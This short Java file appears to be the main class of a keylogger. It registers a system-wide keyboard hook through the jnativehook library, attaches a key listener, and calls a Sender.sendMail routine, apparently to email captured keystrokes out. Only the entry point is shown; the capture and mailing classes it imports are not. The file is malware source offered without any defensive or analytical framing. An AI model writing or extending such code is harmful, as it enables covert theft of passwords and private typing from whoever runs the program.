package main;

import main.handlers.ManageService;
import main.handlers.Sender;
import main.keys.NativeKeyboard;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

public class Main {

 public static void main(String[] args)  {

     ManageService service = new ManageService();
     try {
         Sender.sendMail("TESTING");
         GlobalScreen.registerNativeHook();
     }catch(Throwable e){
         e.printStackTrace();
     }

     GlobalScreen.getInstance().addNativeKeyListener(service.getKeyboard());

 }
}
